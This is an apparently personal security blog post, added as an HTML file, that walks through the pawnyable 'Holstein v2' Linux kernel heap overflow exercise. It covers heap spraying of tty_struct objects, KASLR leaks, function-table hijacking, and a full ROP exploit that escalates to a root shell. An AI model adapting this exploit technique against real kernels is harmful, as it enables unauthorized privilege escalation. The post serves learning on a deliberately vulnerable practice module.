@@ -1,0 +1,319 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] Heap OverFlow · whrds.log</title><meta name="description" content="※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Invalid part">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/kernel-heap-overflow/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-heap-overflow/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-heap-overflow/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] Heap OverFlow · whrds.log"><meta property="og:description" content="※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Invalid part"><meta property="og:url" content="https://whrds.github.io/en/posts/kernel-heap-overflow/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] Heap OverFlow","description":"※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Invalid part","datePublished":"2024-11-14","inLanguage":"en","url":"https://whrds.github.io/en/posts/kernel-heap-overflow/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/kernel-heap-overflow/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] Heap OverFlow</h1><p class="article-description">※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Invalid part</p><div class="article-meta"><time datetime="2024-11-14">Nov 14, 2024</time><span>·</span><span>5 min read</span></div></header><div class="prose"><p><strong>※ Since the analysis was conducted with reference to the data, there may be errors.</strong> </p>
+<p><strong>※ If there is anything that needs to be supplemented or corrected, please let us know and we will check and take action.</strong></p>
+<p><strong><a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a></strong></p>
+<p> [[KERNEL] Holstein Module</p>
+<p>※ If there are any mistakes, please let me know. We will check and correct it. ※ ​Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting ​[KERNEL] Environment Setting※ ​Please let me know if there are any mistakes.</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module">https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module</a>)</p>
+<p>In the post above, we discussed Holstein v1.</p>
+<p>This time, we will cover Holstein v2, which addresses pawnyable’s heap vulnerability.</p>
+<p><a href="https://pawnyable.cafe/linux-kernel/index.html">https://pawnyable.cafe/linux-kernel/index.html</a></p>
+<p> [Linux Kernel Exploitation | PAWNYABLE!</p>
+<p>Linux Kernel Exploitation</p>
+<p>pawnyable.cafe](<a href="https://pawnyable.cafe/linux-kernel/index.html">https://pawnyable.cafe/linux-kernel/index.html</a>)</p>
+<hr>
+<p>First, looking at the modified part of the code, there has been a change in the buffer when inputting and writing values in module_read() and module_write().</p>
+<pre><code>static ssize_t module_read(struct file *file,
+                           char __user *buf, size_t count,
+                           loff_t *f_pos)
+{
+  printk(KERN_INFO &quot;module_read called\n&quot;);
+
+  if (copy_to_user(buf, g_buf, count)) {
+    printk(KERN_INFO &quot;copy_to_user failed\n&quot;);
+    return -EINVAL;
+  }
+
+  return count;
+}
+
+static ssize_t module_write(struct file *file,
+                            const char __user *buf, size_t count,
+                            loff_t *f_pos)
+{
+  printk(KERN_INFO &quot;module_write called\n&quot;);
+
+  if (copy_from_user(g_buf, buf, count)) {
+    printk(KERN_INFO &quot;copy_from_user failed\n&quot;);
+    return -EINVAL;
+  }
+
+  return count;
+}
+</code></pre>
+<p>Safe functions are used rather than _copy_to_user() and _copy_from_user(), which create vulnerabilities by not performing range verification.</p>
+<p>Besides that, the most important part to consider is the part used as an argument.</p>
+<p>If you take a quick look at Holstein v1’s module_read(), you can see that a local variable is created and used.</p>
+<pre><code>static ssize_t module_read(struct file *file,
+ char __user *buf, size_t count,
+ loff_t *f_pos)
+{
+ char kbuf[BUFFER_SIZE] = { 0 };
+
+ printk(KERN_INFO &quot;module_read called\n&quot;);
+
+ memcpy(kbuf, g_buf, BUFFER_SIZE);
+ if (_copy_to_user(buf, kbuf, count)) {
+ printk(KERN_INFO &quot;copy_to_user failed\n&quot;);
+ return -EINVAL;
+ }
+
+ return count;
+}
+</code></pre>
+<p>In the changed code, you can see that although a local variable is declared, data is passed using the g_buf variable.</p>
+<pre><code>copy_to_user(buf, g_buf, count)
+</code></pre>
+<p>If you look at where and how this g_buf is declared, you can see that it is allocated with kmalloc() in module_open().</p>
+<pre><code>static int module_open(struct inode *inode, struct file *file)
+{
+  printk(KERN_INFO &quot;module_open called\n&quot;);
+
+  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
+  if (!g_buf) {
+    printk(KERN_INFO &quot;kmalloc failed&quot;);
+    return -ENOMEM;
+  }
+
+  return 0;
+}
+</code></pre>
+<p>Why is it vulnerable to inputting and reading values into the heap area allocated with kmalloc()?</p>
+<p>The Kernel’s Heap area is an area shared by all drivers and objects used in the Kernel.</p>
+<p>Therefore, it can be used to destroy or exploit other target objects by modulating the value of the heap memory.</p>
+<hr>
+<p>The size of g_buf is 0x400.</p>
+<pre><code>#define BUFFER_SIZE 0x400
+</code></pre>
+<p>Among the structures whose size is most similar to 0x400, there is tty_struct.</p>
+<p>tty_struct is defined in tty.h and is a structure to maintain the state of the TTY.</p>
+<pre><code>struct tty_struct {
+ int magic;
+	struct kref kref;
+	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
+	struct tty_driver *driver;
+	const struct tty_operations *ops;
+ int index;
+ ...
+</code></pre>
+<p>You need to know by what process this structure is executed in order to use it, manipulate it, and use it for exploits.</p>
+<p>This is a structure called when running a virtual terminal such as [ /dev/ptmx ], and is also called in the process of allocating heap in the kernel.</p>
+<p>This structure contains ops, a function table, to execute the appropriate function for each state.</p>
+<pre><code>const struct tty_operations *ops;
+</code></pre>
+<p>Exploit becomes possible if this function table is overwritten with a random table set by the attacker and is called.</p>
+<p>We have confirmed that we need to manipulate the function table, and then we need to check which offset is used among the functions in the function table. For this, the Heap Spray technique must be used. In addition, in order to bypass Kaslr, data in the heap memory area must be read through Heap Spray. </p>
+<ul>
+<li>Find the address to configure Kernel base and random table with Heap Spray</li>
+<li>Check which offset is used in the function table with Heap Spray</li>
+</ul>
+<p>First, configure main() as follows to find the value to perform memory leak.</p>
+<pre><code>int main() {
+ int spray[100];
+ for (int i = 0; i &lt; 50; i++) {
+ spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+ if (spray[i] == -1)
+ fatal(&quot;/dev/ptmx&quot;);
+ }
+
+ int fd = open(&quot;/dev/holstein&quot;, O_RDWR);
+ if (fd == -1)
+ fatal(&quot;/dev/holstein&quot;);
+
+ for (int i = 50; i &lt; 100; i++) {
+ spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+ if (spray[i] == -1)
+ fatal(&quot;/dev/ptmx&quot;);
+ }
+
+ char buf[0x500];
+ memset(buf, 'A', 0x500);
+ write(fd, buf, 0x500);
+
+ getchar(); 
+
+ close(fd);
+ return 0;
+}
+</code></pre>
+<p>By opening [ /dev/ptmx ], the memory including tty_struct is expanded and loaded into the user space to perform debugging.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/001.png" alt=""></p>
+<p>Place bp at the location where g_buf is used and analyze the address.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/002.png" alt=""></p>
+<p>You can see that a similar structure continues, and this part is tty_struct.</p>
+<p>Among these spaces, search for the part that contains the Kernel address and the Heap address for constructing the fake func table.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/003.png" alt=""></p>
+<p>You can find the value for calculating Kernel Base at location 0x418.</p>
+<p>This location is where the original function table is located, and in the case of the function table, it exists on the kernel.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/004.png" alt=""></p>
+<p>Heap address can be found at 0x438.</p>
+<pre><code> char buf[0x500];
+ read(fd, buf, 0x500);
+ kbase = *(unsigned long*)&amp;buf[0x418] - ofs_tty_ops;
+ printf(&quot;[+] kbase = 0x%016lx\n&quot;, kbase);
+ 
+ g_buf = *(unsigned long*)&amp;buf[0x438] - 0x438;
+printf(&quot;[+] g_buf = 0x%016lx\n&quot;, g_buf);
+</code></pre>
+<p>Use the corresponding values to find each address.</p>
+<p>The next thing to do is to see which offset is executed in the function table. This can be easily obtained by manipulating the value at 0x418 with a fake func table and placing addresses with increasing numbers from 0 to n in the function table.</p>
+<pre><code>unsigned long *p = (unsigned long*)&amp;buf;
+for (int i = 0; i &lt; 0x40; i++) {
+ *p++ = 0xffffffffdead0000 + (i &lt;&lt; 8);
+}
+*(unsigned long*)&amp;buf[0x418] = g_buf;
+write(fd, buf, 0x420);
+
+for (int i = 0; i &lt; 100; i++) {
+ ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
+}
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/005.png" alt=""></p>
+<p>You can see that the offset is 0xc.</p>
+<p>Because the rip register can be manipulated, SMEP can be bypassed. </p>
+<p>Exploit can be done by writing code that bypasses KPTI, which was covered once in the link below.</p>
+<p><a href="https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass</a></p>
+<p> [[KERNEL] KROP_(SMEP bypass)</p>
+<p>※ If there are any mistakes, please let me know. We will check and correct it. ※ In the user area, ROP was used to bypass the NX-BIT protection technique. ROP in the kernel area also uses a protection technique called SMEP.</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass</a>)<a href="https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass</a></p>
+<p> [[KERNEL] KROP_(KPTI bypass)</p>
+<p>※ If there are any mistakes, please let me know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP.  #!/bin/shqemu-system-x86_64 \ -m 64M \ -nographic \ -kernel bz</p>
+<p><a href="http://whrdud727.tistory.com">whrdud727.tistory.com</a>](<a href="https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass">https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass</a>)</p>
+<p>Here is the full exploit code.</p>
+<pre><code>#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define ofs_tty_ops 0xc38880
+#define addr_commit_creds (kbase + 0x0744b0)
+#define addr_prepare_kernel_cred (kbase + 0x074650)
+#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
+#define rop_pop_rdi (kbase + 0x0d748d)
+#define rop_pop_rcx (kbase + 0x13c1c4)
+#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
+#define rop_bypass_kpti (kbase + 0x800e26)
+
+unsigned long kbase, g_buf;
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+
+static void win() {
+  char *argv[] = { &quot;/bin/sh&quot;, NULL };
+  char *envp[] = { NULL };
+  puts(&quot;[+] win!&quot;);
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+
+static void save_state() {
+  asm(
+      &quot;movq %%cs, %0\n&quot;
+      &quot;movq %%ss, %1\n&quot;
+      &quot;movq %%rsp, %2\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
+}
+
+int main() {
+  save_state();
+
+  // tty_struct�췷pray
+  int spray[100];
+  for (int i = 0; i &lt; 50; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1)
+      fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  int fd = open(&quot;/dev/holstein&quot;, O_RDWR);
+  if (fd == -1)
+    fatal(&quot;/dev/holstein&quot;);
+
+  for (int i = 50; i &lt; 100; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1)
+      fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  char buf[0x500];
+  read(fd, buf, 0x500);
+  kbase = *(unsigned long*)&amp;buf[0x418] - ofs_tty_ops;
+  printf(&quot;[+] kbase = 0x%016lx\n&quot;, kbase);
+
+  g_buf = *(unsigned long*)&amp;buf[0x438] - 0x438;
+  printf(&quot;[+] g_buf = 0x%016lx\n&quot;, g_buf);
+
+  unsigned long *p = (unsigned long*)&amp;buf[0x400];
+  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
+  *(unsigned long*)&amp;buf[0x418] = g_buf + 0x400;
+
+  unsigned long *chain = (unsigned long*)&amp;buf;
+  *chain++ = rop_pop_rdi;
+  *chain++ = 0;
+  *chain++ = addr_prepare_kernel_cred;
+  *chain++ = rop_pop_rcx;
+  *chain++ = 0;
+  *chain++ = rop_mov_rdi_rax_rep_movsq;
+  *chain++ = addr_commit_creds;
+  *chain++ = rop_bypass_kpti;
+  *chain++ = 0xdeadbeef;
+  *chain++ = 0xdeadbeef;
+  *chain++ = (unsigned long)&amp;win;
+  *chain++ = user_cs;
+  *chain++ = user_rflags;
+  *chain++ = user_rsp;
+  *chain++ = user_ss;
+
+  write(fd, buf, 0x500);
+
+  for (int i = 0; i &lt; 100; i++) {
+    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); 
+  }
+
+  getchar();
+  return 0;
+}
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/006.png" alt=""></p>
+<p>Successfully escalated privileges.</p>
+<p>The image below is the part that was organized while analyzing the exploit code above.</p>
+<p>There may be some parts that are not accurate, but I think you can refer to it.</p>
+<p><img src="/assets/images/tistory/tistory-1b15a9a45937/007.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/kernel-heap-overflow/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
